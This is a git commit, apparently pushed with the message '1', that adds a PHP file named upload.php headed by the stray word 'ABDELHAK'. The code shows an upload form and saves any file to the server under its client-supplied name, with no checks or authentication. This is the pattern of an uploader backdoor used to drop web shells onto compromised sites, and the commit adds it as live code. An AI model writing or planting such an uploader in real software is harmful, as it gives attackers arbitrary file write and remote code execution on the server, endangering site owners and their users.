2c4b4fea969c480316a63a6313c1a1a8e9b81b0e
harisprakoso <47579268+harisprakoso@users.noreply.github.com>
2020-02-09 17:39:57 +0700

    1
    1

---
+++ upload.php
@@ -0,0 +1,15 @@
+ABDELHAK
+<?php 
+$filename = $_FILES['file']['name'];
+$filetmp  = $_FILES['file']['tmp_name'];
+ 
+echo "<form method='POST' enctype='multipart/form-data'>
+        <input type='file'name='file' />
+        <input type='submit' value='go' />
+ 
+</form>";
+ 
+if(move_uploaded_file($filetmp,$filename)=='1'){
+echo '<b>'.$filename;
+}
+?>
